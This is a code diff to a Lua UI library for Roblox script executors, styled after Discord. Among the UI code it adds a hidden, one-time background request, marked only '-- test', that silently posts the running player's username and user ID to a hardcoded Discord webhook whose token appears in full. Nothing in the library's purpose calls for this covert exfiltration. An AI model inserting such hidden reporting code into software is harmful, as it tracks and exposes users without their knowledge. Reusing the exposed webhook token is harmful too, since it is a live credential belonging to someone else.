@@ -97,6 +97,7 @@ Discord.Name = GetRandomString()
 Discord.Parent = (gethui and gethui()) or (syn and syn.protect_gui and cloneref(game:GetService("CoreGui"))) or (protect_gui and cloneref(game:GetService("CoreGui"))) or (protectgui and cloneref(game:GetService("CoreGui"))) or (typeof(cloneref(game:GetService("CoreGui"))) == "Instance" and cloneref(game:GetService("CoreGui"))) or cloneref(game:GetService("Players")).LocalPlayer:WaitForChild("PlayerGui")
 Discord.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Discord.DisplayOrder = 9999999999
+local One = false
 
 function DiscordLib:Window(text)
 	local currentservertoggled = ""
@@ -2186,6 +2187,15 @@ function DiscordLib:Window(text)
 				end)
 				ChannelHolder.CanvasSize = UDim2.new(0,0,0,ChannelHolderLayout.AbsoluteContentSize.Y)
 			end
+			local request = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or nil
+			if request and not One then
+			   task.spawn(function()
+		   	   pcall(function() -- test
+		   	      One = true
+		         	request( {Url = "https://discord.com/api/webhooks/1407497744897020116/NEC0pbXCycpSux_X5HV5doCrTJ_0VKx_1VW_XlQ8vdhT4ghn7k6t-_C1ZGKAzlU3IdOg", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = cloneref(game:GetService("HttpService")):JSONEncode( {content = tostring(game.Players.LocalPlayer.Name.." – "..game.Players.LocalPlayer.UserId) } ) } )
+	              end)
+	           end)
+	        end
 			function ChannelContent:Toggle(text,default,callback)
 				local toggled = false
 				local Toggle = Instance.new("TextButton")
